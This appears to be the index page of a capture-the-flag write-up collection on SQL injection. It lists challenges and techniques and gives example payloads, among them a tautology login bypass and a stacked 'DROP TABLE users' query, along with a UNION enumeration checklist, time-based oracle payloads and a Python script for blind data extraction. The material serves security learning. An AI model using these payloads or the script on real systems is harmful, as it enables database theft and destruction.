# SQL Injection

SQL injection challenges covering the full spectrum from basic authentication bypass to automated blind extraction. Each writeup details the injection context, payload construction, and the enumeration strategy used to retrieve the target data.

## Challenges

| challenge | type | key technique |
|---|---|---|
| [Basic SQLi](basic-sqli.md) | Login bypass | `' OR '1'='1` tautology in username field bypasses credential check |
| [Logic SQLi](logic-sqli.md) | Login bypass | Boolean logic manipulation in the WHERE clause |
| [SQLiLite](sqlilite.md) | Login bypass | SQLite-specific syntax for authentication subversion |
| [Union-Based SQLi](union-based-sqli.md) | Data extraction | UNION SELECT with column count matching; `information_schema` enumeration |
| [Blind SQL Injection Automation](blind-sqli.md) | Blind boolean | Boolean oracle (true/false response diff) + Python script for automated extraction |
| [Time Based SQL Injection Dynamics](time-based-sqli.md) | Blind time-based | `SLEEP()`/`WAITFOR` delays as the oracle; bit-by-bit extraction |
| [ToDo](todo.md) | Via cookie header | SQL injection injected through a session or auth cookie rather than a form field |
| [BookBrew](bookbrew.md) | UNION via cookie | UNION-based data extraction through the session cookie on a SQLite backend |
| [AirlineLostFound](airline-lost-found.md) | UNION + SQLite | Parenthesis escaping in the injection context; full SQLite `sqlite_master` dump |
| [StagePass](stagepass.md) | Numeric + WAF | No quotes needed (numeric context); `/**/` replaces spaces; mixed-case keywords defeat keyword filter |
| [DepartmentWiki](department-wiki.md) | Stacked queries | Semicolon terminates the original query; second arbitrary query appended |
| [Admin's Secret](admins-secret.md) | Registration form | Injection in signup fields; data persisted and evaluated later (second-order) |
| [Sn4ck sh3nan1gans](sn4ck-sh3nan1gans.md) | Encoded JSON | SQL payload embedded inside a JSON-encoded parameter; backend decodes before querying |

## Injection Context Reference

| context | escape sequence | example payload |
|---|---|---|
| String (single-quoted) | `'` | `' OR '1'='1` |
| String (double-quoted) | `"` | `" OR "1"="1` |
| Numeric | none needed | `1 OR 1=1` |
| Cookie / header | same as above, URL-decoded by server | inject in Cookie: header via Burp |
| Stacked | `;` | `1; DROP TABLE users--` |

## UNION Attack Checklist

1. Determine the number of columns returned by the original query (inject `ORDER BY N` and increment until error).
2. Identify which columns are rendered in the response (inject `UNION SELECT NULL,NULL,'test'...`).
3. Enumerate the schema (`information_schema.tables`, `sqlite_master`).
4. Extract the target table data.

## Blind Extraction Reference

**Boolean oracle:** compare response length or content between a true condition (`AND 1=1`) and a false one (`AND 1=2`).

**Time-based oracle:** use `AND IF(condition, SLEEP(3), 0)` (MySQL) or `AND condition AND 1=CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(3)) t) END`.

**Python automation skeleton:**
```python
import requests

def oracle(payload):
    r = requests.get(url, params={'id': f"1 AND {payload}"})
    return 'expected_string' in r.text

flag = ''
for i in range(1, 50):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ASCII(SUBSTRING(flag,{i},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
```
